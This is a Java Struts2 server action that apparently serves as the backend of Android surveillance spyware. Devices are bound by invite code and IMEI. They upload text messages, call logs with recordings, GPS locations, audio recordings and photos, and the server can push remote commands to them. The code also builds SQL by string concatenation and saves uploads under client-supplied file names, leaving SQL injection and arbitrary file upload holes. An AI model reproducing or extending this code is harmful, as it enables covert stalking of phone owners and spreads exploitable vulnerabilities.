package com.android.smsserver;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import net.sf.json.JSONArray;
import net.sf.json.JSONObject;

import org.apache.commons.io.FileUtils;
import org.apache.log4j.Logger;
import org.apache.struts2.ServletActionContext;

import com.android.db.SqlUtil;
import com.android.page.Page;
import com.android.push.PushClient;
import com.opensymphony.xwork2.ActionSupport;

public class ClientAction extends ActionSupport {

	/**
	 * 
	 */
	private static Logger log=Logger.getLogger(ClientAction.class);
	private static final long serialVersionUID = 1L;
	private Page page = new Page();
	private List<String> array = new ArrayList<String>();
	private Map<String, Object> map = new HashMap<String, Object>();
	private Map<String, String> mapparam = new HashMap<String, String>();
	private List<Map<String, Object>> lmo = new ArrayList<Map<String, Object>>();

	private File[] upload; // 上传的文件
	private String[] uploadFileName; // 文件名称
	private String[] uploadContentType; // 文件类型

	private boolean isflag() {
		String sql = "SELECT *,SYSDATE() FROM devices where id=? and state=1 and endtime>=SYSDATE()";
		int i = SqlUtil.searchCount(sql,
				new Object[] { mapparam.get("deviceid") });
		if (i > 0) {
			log.info("账户可用");
			return true;
		} else {
			log.info("账户不可用");
			return false;
		}
	}

	/**
	 * 客户端认证
	 * 
	 * @return
	 */
	public String AuthDevice() {

			String sql = "select a.*,b.serverid from devices a left join user b on a.userid=b.id where code=?";
			Map<String, Object> mo = SqlUtil.searchMap(sql,
					new Object[] { mapparam.get("code") });
			if ("".equals(mo.get("deviceimei").toString())) {
				sql = "update devices set deviceimei=?,phone=?,clientid=? where id=?";
				int i = SqlUtil.update(
						sql,
						new Object[] { mapparam.get("deviceimei"),
								mapparam.get("phone"),
								mapparam.get("clientid"), mo.get("id") });
				if (i > 0) {
					map.put("state", 1);
					map.put("id", mo.get("id"));
					map.put("serverid", mo.get("serverid"));
				} else {
					map.put("state", 0);
					map.put("msg", "认证失败,请联系管理员");
				}
			} else {
				if (mapparam.get("deviceimei").equals(
						mo.get("deviceimei").toString())) {
					sql = "update devices set phone=? ,clientid=? where id=?";
					SqlUtil.update(sql, new Object[] { mapparam.get("phone"),
							mapparam.get("clientid"), mo.get("id") });
					map.put("state", 1);
					map.put("id", mo.get("id"));
					map.put("serverid", mo.get("serverid"));
				} else {
					map.put("state", 0);
					map.put("msg", "该邀请码已经绑定用户");
				}
			
		} 
		return "mapjson";
	}

	/**
	 * 客户端pushclientid更新
	 * 
	 * @return
	 */
	public String UpdateClientId() {
		String sql = "update devices set clientid=? where id=?";
		int i = SqlUtil.update(sql, new Object[] { mapparam.get("clientid"),
				mapparam.get("id") });
		if (i > 0) {
			map.put("state", 1);
		} else {
			map.put("state", 0);
		}
		return "mapjson";
	}

	/**
	 * 发送消息到Server
	 * 
	 * @return
	 */
	public String sendToServer() {
		
		boolean isflag = PushClient.SendMessage(mapparam.get("clientid"),
				mapparam.get("action"));
		if (isflag) {
			map.put("state", 1);
		} else {
			map.put("state", 0);
		}
		return "mapjson";
	}

	/**
	 * 添加短信
	 * 
	 * @return
	 */
	public String AddSms() {
		if (isflag()) {
			String sql = "insert into devicesms(deviceid,phonename,phonenum,type,content,ctime) values ";
			JSONArray ja = JSONArray.fromObject(mapparam.get("json"));
			for (int i = 0; i < ja.size(); i++) {
				JSONObject jo = ja.getJSONObject(i);
				sql += "('" + mapparam.get("deviceid") + "','"
						+ jo.get("phonename") + "','" + jo.get("address")
						+ "','" + jo.get("type") + "','" + jo.get("body")
						+ "','" + jo.get("dates") + "'),";
			}
			sql = sql.substring(0, sql.length() - 1);
			int i = SqlUtil.save(sql, new Object[] {});
			if (i > 0) {
				map.put("state", 1);
				map.put("action", "sms");
			} else {
				map.put("state", 0);
				map.put("action", "sms");
			}
		} else {
			map.put("state", 0);
			map.put("action", "sms");
		}
		return "mapjson";
	}

	/**
	 * 添加通话
	 * 
	 * @return
	 */
	public String AddCall() {
		if (isflag()) {
			String distPath = ServletActionContext.getServletContext()
					.getRealPath("sound") + "/";
			if (upload != null && upload.length > 0) {
				for (int i = 0; i < upload.length; i++) {
					File dist = new File(distPath + uploadFileName[i]);
					try {
						FileUtils.copyFile(upload[i], dist);
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				}
			}

			String sql = "insert into devicephone(deviceid,phonename,phonenum,type,shichang,luyinfile,ctime) values ";
			JSONArray ja = JSONArray.fromObject(mapparam.get("json"));
			for (int i = 0; i < ja.size(); i++) {
				JSONObject jo = ja.getJSONObject(i);
				sql += "('" + mapparam.get("deviceid") + "','"
						+ jo.get("phonename") + "','" + jo.get("address")
						+ "','" + jo.get("type") + "','" + jo.get("duration")
						+ "','" + jo.get("recordfile") + "','"
						+ jo.get("dates") + "'),";
			}
			sql = sql.substring(0, sql.length() - 1);
			int i = SqlUtil.save(sql, new Object[] {});
			if (i > 0) {
				map.put("state", 1);
				map.put("action", "call");
			} else {
				map.put("state", 0);
				map.put("action", "call");
			}
		} else {
			map.put("state", 0);
			map.put("action", "call");
		}
		return "mapjson";
	}

	/**
	 * 添加位置
	 * 
	 * @return
	 */
	public String AddLoc() {
		if (isflag()) {
			String sql = "insert into devicelocation(deviceid,location,longitude,latitude,ctime) values ";
			JSONArray ja = JSONArray.fromObject(mapparam.get("json"));
			for (int i = 0; i < ja.size(); i++) {
				JSONObject jo = ja.getJSONObject(i);
				sql += "('" + mapparam.get("deviceid") + "','" + jo.get("addr")
						+ "','" + jo.get("longitude") + "','"
						+ jo.get("latitude") + "','" + jo.get("time") + "'),";
			}
			sql = sql.substring(0, sql.length() - 1);
			int i = SqlUtil.save(sql, new Object[] {});
			if (i > 0) {
				map.put("state", 1);
				map.put("action", "loc");
			} else {
				map.put("state", 0);
				map.put("action", "loc");
			}
		} else {
			map.put("state", 0);
			map.put("action", "loc");
		}
		return "mapjson";
	}
	/**
	 * 添加录音
	 * 
	 * @return
	 */
	public String AddRecord() {
		log.info("添加录音");
		if (isflag()) {
			
			String distPath = ServletActionContext.getServletContext()
					.getRealPath("sound") + "/";
			log.info(distPath+"---"+upload);
			String filename = "";
			if (upload != null && upload.length > 0) {
				filename=uploadFileName[0];
				File dist = new File(distPath + filename);
				try {
					FileUtils.copyFile(upload[0], dist);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			
			String sql = "insert into devicesound(deviceid,starttime,soundfile,ctime) values ('" + mapparam.get("deviceid") + "','"+ mapparam.get("starttime") + "','" + filename+ "',SYSDATE())";
			log.info(sql);
			int i = SqlUtil.save(sql, new Object[] {});
			if (i > 0) {
				map.put("state", 1);
				map.put("action", "record");
			} else {
				map.put("state", 0);
				map.put("action", "record");
			}
		} else {
			map.put("state", 0);
			map.put("action", "record");
		}
		return "mapjson";
	}
	/**
	 * 添加拍照
	 * 
	 * @return
	 */
	public String AddPhoto() {
		log.info("添加拍照");
		if (isflag()) {
			log.info("上传照片");
			String distPath = ServletActionContext.getServletContext()
					.getRealPath("pic") + "/";
			log.info(distPath);
			String filename="";
			if (upload != null && upload.length > 0) {
				log.info("判断"+upload.length);
				filename=uploadFileName[0];
				File dist = new File(distPath + uploadFileName[0]);
				try {
					FileUtils.copyFile(upload[0], dist);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					log.info("异常"+e.getMessage());
					filename="";
				}
			}
			log.info("存储到数据库");
			String sql = "insert into devicephoto(deviceid,phototime,file,ctime) values ('" + mapparam.get("deviceid") + "','"+ mapparam.get("phototime") + "','" +filename+ "',SYSDATE())";
			log.info(sql);
			int i = SqlUtil.save(sql, new Object[] {});
			if (i > 0) {
				map.put("state", 1);
				map.put("action", "photo");
			} else {
				map.put("state", 0);
				map.put("action", "photo");
			}
		} else {
			map.put("state", 0);
			map.put("action", "photo");
		}
		return "mapjson";
	}
	public Map<String, Object> getMap() {
		System.out.println(map);
		return map;
	}

	public void setMap(Map<String, Object> map) {
		this.map = map;
	}

	public List<Map<String, Object>> getLmo() {
		return lmo;
	}

	public void setLmo(List<Map<String, Object>> lmo) {
		this.lmo = lmo;
	}

	public Page getPage() {
		return page;
	}

	public void setPage(Page page) {
		this.page = page;
	}

	public Map<String, String> getMapparam() {
		return mapparam;
	}

	public void setMapparam(Map<String, String> mapparam) {
		this.mapparam = mapparam;
	}

	public File[] getUpload() {
		return upload;
	}

	public void setUpload(File[] upload) {
		this.upload = upload;
	}

	public String[] getUploadFileName() {
		return uploadFileName;
	}

	public void setUploadFileName(String[] uploadFileName) {
		this.uploadFileName = uploadFileName;
	}

	public String[] getUploadContentType() {
		return uploadContentType;
	}

	public void setUploadContentType(String[] uploadContentType) {
		this.uploadContentType = uploadContentType;
	}

}
